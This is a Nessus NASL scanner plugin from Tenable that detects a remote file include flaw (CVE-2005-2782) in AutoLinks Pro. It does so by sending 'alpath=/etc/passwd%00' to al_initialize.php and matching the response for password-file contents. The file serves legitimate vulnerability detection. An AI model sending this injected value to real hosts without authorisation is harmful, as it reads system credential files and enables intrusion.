#
# (C) Tenable Network Security
#


if (description) {
  script_id(19522);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2782");
  script_bugtraq_id(14686);

  name["english"] = "AutoLinks Pro alpath Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that suffers from a remote
file include flaw. 

Description :

The remote host is running AutoLinks Pro, a commercial link management
package. 

The version of AutoLinks Pro installed on the remote host allows
attackers to control the 'alpath' parameter used when including PHP
code in the 'al_initialize.php' script.  By leveraging this flaw, an
unauthenticated attacker is able to view arbitrary files on the remote
host and to execute arbitrary PHP code, possibly taken from third-
party hosts. 

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for alpath parameter file include vulnerability in AutoLinks Pro";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/al_initialize.php?",
      "alpath=/etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but the other flaws
    #     would still be present.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
  ) {
    security_warning(port);
    exit(0);
  }
}

